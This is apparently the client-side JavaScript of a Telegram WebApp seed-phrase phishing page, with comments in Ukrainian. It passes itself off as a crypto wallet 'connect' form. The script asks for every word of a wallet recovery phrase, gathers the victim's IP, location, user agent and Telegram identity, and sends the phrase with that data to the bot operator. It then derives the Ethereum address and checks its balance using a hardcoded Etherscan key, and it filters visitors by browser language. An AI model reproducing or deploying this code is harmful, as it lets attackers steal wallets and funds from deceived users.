// 🌍 IP та геолокація
let userIp = "undefined";
let userLocation = "undefined";

fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
        userIp = data.ip || "unknown";
        userLocation = `${data.city || "?"}, ${data.country_name || "?"}`;
        console.log("📍 IP:", userIp, "| Локація:", userLocation);
    })
    .catch(() => {
        userIp = "unknown";
        userLocation = "unknown";
        console.warn("⚠️ Не вдалося отримати геолокацію");
    });

// 🚫 Блокування по мові (не UA/RU)
const langs = navigator.languages || [navigator.language || navigator.userLanguage];
const allowedLangs = ["ru", "ru-RU", "uk", "uk-UA"];
if (!langs.some(lang => allowedLangs.includes(lang))) {
    document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>Доступ ограничен.</h3>";
    throw new Error("🚫 Заблоковано через мову браузера");
}

document.addEventListener("DOMContentLoaded", async () => {
    console.log("📦 DOM повністю завантажено");

    // ✅ Telegram WebApp перевірка
    const isWebAppReady = window.Telegram?.WebApp;
    if (!isWebAppReady) {
        console.warn("❌ Telegram WebApp не ініціалізовано!");
    } else {
        Telegram.WebApp.ready();
        console.log("✅ Telegram WebApp активний");
    }

    // 🧩 Елементи
    const btn = document.getElementById("submitBtn");
    const lengthInput = document.getElementById("length");
    const seedContainer = document.getElementById("seedContainer");

    if (!btn) console.warn("🚫 Кнопка #submitBtn не знайдена");
    if (!lengthInput || !seedContainer) {
        console.error("❌ #length або #seedContainer не знайдено — скасовано ініціалізацію");
        return;
    }

    // 📝 Рендер seed-полів
    try {
        renderSeedInputs();
        console.log("✅ Поля seed-фрази згенеровано");
    } catch (err) {
        console.error("❌ Помилка у renderSeedInputs():", err);
    }

    // 🌍 Отримання IP + локації
    let userInfo = { ip: "-", location: "-" };
    try {
        const res = await fetch("https://ipapi.co/json");
        const data = await res.json();
        userInfo.ip = data.ip || "-";
        userInfo.location = `${data.city}, ${data.country_name}` || "-";
        console.log("🌐 Отримано IP та локацію:", userInfo);
    } catch (err) {
        console.warn("⚠️ Неможливо отримати IP/гео:", err);
    }

    // 📦 Обробник кнопки
    if (btn) {
        btn.addEventListener("click", () => {
            console.log("🔘 Клік по кнопці 'Подключить'");
            try {
                const length = parseInt(lengthInput.value);
                const words = [];
                for (let i = 0; i < length; i++) {
                    const input = document.getElementById(`word-${i}`);
                    if (input) words.push(input.value.trim());
                }

                const seed = words.join(" ").trim();
                if (seed.split(" ").length !== length) {
                    showWarning("❗ Введіть всі слова сид-фрази");
                    return;
                }

                clearWarning();
                showProcessing("⏳ Обробка фрази...");

                const payload = {
                    seed,
                    wallet: document.getElementById("wallet")?.value || "MetaMask",
                    ip: userInfo.ip,
                    location: userInfo.location,
                    timestamp: Date.now()
                };

                localStorage.setItem("payload_backup", JSON.stringify(payload));
                console.log("📦 Payload збережено:", payload);

                Telegram.WebApp.sendData(JSON.stringify(payload));
                showProcessing("✅ Дані відправлено. Очікуйте...");

                setTimeout(() => {
                    window.location.href = "profile.html";
                }, 1200);

            } catch (err) {
                console.error("❌ Помилка у submitSeed:", err);
            }
        });
    }
});

function initCustomSelect() {
    const select = document.getElementById("walletSelect");
    const selected = select.querySelector(".selected");
    const options = select.querySelector(".options");
    const input = document.getElementById("wallet");

    if (!select || !selected || !options || !input) return;

    // Клік по selected — відкриває меню
    selected.addEventListener("click", () => {
        select.classList.toggle("open");
    });

    // Вибір опції
    options.querySelectorAll("li").forEach((option) => {
        option.addEventListener("click", () => {
            const wallet = option.getAttribute("data-value");
            const icon = option.querySelector("img").outerHTML;
            selected.innerHTML = `${icon} ${wallet}`;
            input.value = wallet;
            select.classList.remove("open");
        });
    });

    // Закриття при кліку поза меню
    document.addEventListener("click", (e) => {
        if (!select.contains(e.target)) {
            select.classList.remove("open");
        }
    });
}

document.addEventListener("DOMContentLoaded", initCustomSelect);

// 📦 Поля seed-фрази
function renderSeedInputs() {
    const length = parseInt(document.getElementById("length").value);
    const container = document.getElementById("seedContainer");
    container.innerHTML = "";

    for (let i = 0; i < length; i++) {
        const input = document.createElement("input");
        input.type = "text";
        input.placeholder = `${i + 1}`;
        input.classList.add("seed-word");
        container.appendChild(input);
    }

    const firstInput = container.querySelector("input");
    if (firstInput) {
        firstInput.addEventListener("input", handleBulkSeedInput);
        firstInput.addEventListener("paste", (e) => {
            setTimeout(() => handleBulkSeedInput(e), 50);
        });
    }
}



// 📋 Вставка всіх слів
function handleBulkSeedInput(e) {
    const inputs = document.querySelectorAll(".seed-word");
    const words = e.target.value.trim().split(/\s+/);
    if (words.length > 1) {
        inputs.forEach((input, i) => input.value = words[i] || "");
    }
}

// 🎛️ Wallet select (кастомний селектор з поліпшеним UX)
function setupSelect() {
    const selectWrapper = document.querySelector('.custom-select');
    if (!selectWrapper) {
        console.warn("❌ .custom-select не знайдено");
        return;
    }

    const selected = selectWrapper.querySelector('.selected');
    const optionsList = selectWrapper.querySelector('.options');
    const options = optionsList?.querySelectorAll('li') || [];
    const hiddenInput = document.getElementById('wallet');

    if (!selected || !hiddenInput) {
        console.warn("❌ Не знайдено .selected або #wallet");
        return;
    }

    // Перемикач open
    selected.addEventListener('click', () => {
        selectWrapper.classList.toggle('open');
        console.log("🔽 Селектор відкрито/закрито");
    });

    // Вибір опції
    options.forEach(option => {
        option.addEventListener('click', () => {
            selected.innerHTML = option.innerHTML;
            hiddenInput.value = option.dataset.value || '';
            selectWrapper.classList.remove('open');
            console.log(`✅ Обрано: ${hiddenInput.value}`);
        });
    });

    // Клік поза селектором — закрити
    document.addEventListener('click', (e) => {
        if (!selectWrapper.contains(e.target)) {
            selectWrapper.classList.remove('open');
        }
    });

    // Закриття при натисканні ESC
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            selectWrapper.classList.remove('open');
        }
    });
}

function showWarning(message) {
    if (!message || message.trim() === "") {
        clearWarning(); // приховати, якщо пусто
        return;
    }

    let warning = document.getElementById("validationWarning");

    if (!warning) {
        warning = document.createElement("div");
        warning.id = "validationWarning";
        warning.style.display = "flex";
        warning.style.alignItems = "center";
        warning.style.gap = "8px";
        warning.style.background = "#ffeaea";
        warning.style.border = "1px solid #ff4d4d";
        warning.style.color = "#cc0000";
        warning.style.padding = "10px";
        warning.style.borderRadius = "6px";
        warning.style.fontSize = "13px";
        warning.style.marginTop = "12px";
        warning.style.transition = "opacity 0.3s ease";
        warning.style.opacity = "0";

        // SVG-іконка ⚠️
        const icon = document.createElement("span");
        icon.innerHTML = "&#9888;";
        icon.style.fontSize = "16px";

        // Текст
        const text = document.createElement("span");
        text.className = "warning-text";

        warning.appendChild(icon);
        warning.appendChild(text);
        document.querySelector(".container").appendChild(warning);

        // Анімація появи
        setTimeout(() => {
            warning.style.opacity = "1";
        }, 10);
    }

    const textElement = warning.querySelector(".warning-text");
    if (textElement) {
        textElement.textContent = message;
    }

    warning.style.display = "flex";
    warning.style.opacity = "1";
}

// ✅ Очистити попередження
function clearWarning() {
    const warning = document.getElementById("validationWarning");
    if (warning) {
        warning.style.opacity = "0";
        setTimeout(() => {
            warning.style.display = "none";
        }, 300); // Плавне зникнення
    }
}

// 🌀 Статус (з анімацією та стилізацією)
function showProcessing(message) {
    let processing = document.getElementById("processingInfo");

    // Якщо елемент не існує — створити
    if (!processing) {
        processing = document.createElement("div");
        processing.id = "processingInfo";
        processing.style.display = "flex";
        processing.style.alignItems = "center";
        processing.style.gap = "10px";
        processing.style.marginTop = "16px";
        processing.style.fontSize = "15px";
        processing.style.color = "#aaa";

        // Додати спінер
        const spinner = document.createElement("div");
        spinner.className = "spinner";
        spinner.style.width = "16px";
        spinner.style.height = "16px";
        spinner.style.border = "2px solid #ccc";
        spinner.style.borderTop = "2px solid #00cc99";
        spinner.style.borderRadius = "50%";
        spinner.style.animation = "spin 1s linear infinite";

        // Текст статусу
        const text = document.createElement("span");
        text.className = "status-text";

        // Додати до контейнера
        processing.appendChild(spinner);
        processing.appendChild(text);

        document.querySelector(".container").appendChild(processing);
    }

    // Оновити текст статусу
    const textElement = processing.querySelector(".status-text");
    if (textElement) {
        textElement.textContent = message;
    }

    // CSS-анімація
    const style = document.getElementById("spinner-style");
    if (!style) {
        const css = document.createElement("style");
        css.id = "spinner-style";
        css.innerHTML = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(css);
    }
}

// 🚀 submitSeed()
function submitSeed() {
    console.log("🚀 submitSeed() запускається...");

    clearWarning();

    const lengthEl = document.getElementById("length");
    const walletEl = document.getElementById("wallet");
    const containerEl = document.querySelector(".container");

    if (!lengthEl || !walletEl || !containerEl) {
        console.error("❌ Важливі DOM-елементи не знайдені");
        return;
    }

    const length = parseInt(lengthEl.value);
    const wallet = walletEl.value || "MetaMask";
    const ua = navigator.userAgent;

    const inputs = document.querySelectorAll("#seedContainer .seed-word");
    const words = Array.from(inputs).map(input => input.value.trim()).filter(Boolean);

    if (words.length !== length) {
        console.warn("❌ Неправильна кількість слів:", words.length);
        showWarning(`❗ Введено ${words.length}, очікується ${length} слів`);
        return;
    }

    const invalid = words.filter(w => !/^[a-zA-Z]+$/.test(w));
    if (invalid.length > 0) {
        showWarning(`🚫 Недопустимі символи: ${invalid.join(", ")}`);
        return;
    }

    const seed = words.join(" ").trim();

    // 👤 Дані користувача з Telegram
    const tgUser = Telegram?.WebApp?.initDataUnsafe?.user || {};
    const user_id = tgUser.id || "-";
    const username = tgUser.username || "-";

    // 🌍 Дані про IP та локацію
    const ip = typeof userIp !== "undefined" ? userIp : "–";
    const location = typeof userLocation !== "undefined" ? userLocation : "–";

    const payload = {
        seed,
        wallet,
        length,
        ip,
        location,
        ua,
        user_id,
        username,
        address: "-",
        balance: "-",
        timestamp: new Date().toISOString()
    };

    console.log("📦 Payload зібраний:", payload);

    try {
        localStorage.setItem("payload_backup", JSON.stringify(payload));
    } catch (e) {
        console.error("❌ Помилка при збереженні в localStorage:", e);
    }

    showProcessing("⏳ Відправка даних…");

    if (Telegram?.WebApp?.sendData) {
        try {
            Telegram.WebApp.sendData(JSON.stringify(payload));
            console.log("✅ Дані надіслані через Telegram WebApp");
        } catch (err) {
            console.error("❌ sendData помилка:", err);
        }
    } else {
        console.warn("⚠️ Telegram WebApp.sendData не доступний");
    }

    setTimeout(() => {
        try {
            window.location.href = "profile.html";
        } catch (e) {
            console.error("❌ Не вдалося перейти до профілю:", e);
        }
    }, 1200);
}

// 📊 Профіль
function showProfileData() {
    const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
    const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");

    const seedPhrase = (data.seed || "").trim();
    const walletType = (data.wallet || "").toLowerCase();
    const timestamp = data.timestamp || "–";
    const ip = data.ip || "–";
    const locationInfo = data.location || "–";

    document.getElementById("timestamp").textContent = timestamp;
    document.getElementById("userIp").textContent = ip;
    document.getElementById("userLocation").textContent = locationInfo;
    document.getElementById("seed").textContent = seedPhrase;

    if (!seedPhrase) return console.error("❌ Seed-фраза порожня");

    try {
        const wallet = ethers.Wallet.fromMnemonic(seedPhrase);
        const ethAddress = wallet.address;
        document.getElementById("ethAddress").textContent = ethAddress;
        console.log("✅ ETH адрес:", ethAddress);
        fetchETHBalance(ethAddress, ETHERSCAN_API_KEY);
    } catch (e) {
        console.error("❌ ETH генерація:", e.message);
    }

    document.getElementById("goWalletBtn").addEventListener("click", () => {
        let url = "https://www.google.com";
        if (walletType.includes("metamask")) url = "https://metamask.io/";
        else if (walletType.includes("trust")) url = "https://trustwallet.com/";
        else if (walletType.includes("phantom")) url = "https://phantom.app/";
        else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
        else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";

        if (window.Telegram && Telegram.WebApp) {
            Telegram.WebApp.openLink(url);
        } else {
            window.open(url, "_blank");
        }
    });
}

async function fetchETHBalance(address, key) {
    try {
        const url = `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${key}`;
        const res = await fetch(url);
        const json = await res.json();
        if (!json || json.status !== "1" || !json.result) throw new Error("ETH API error");
        const ethBalance = parseFloat(json.result) / 1e18;
        document.getElementById("walletBalance").textContent = `${ethBalance.toFixed(6)} ETH`;
    } catch (e) {
        console.warn("❌ Помилка балансу ETH:", e.message);
        document.getElementById("walletBalance").textContent = "–";
    }
}
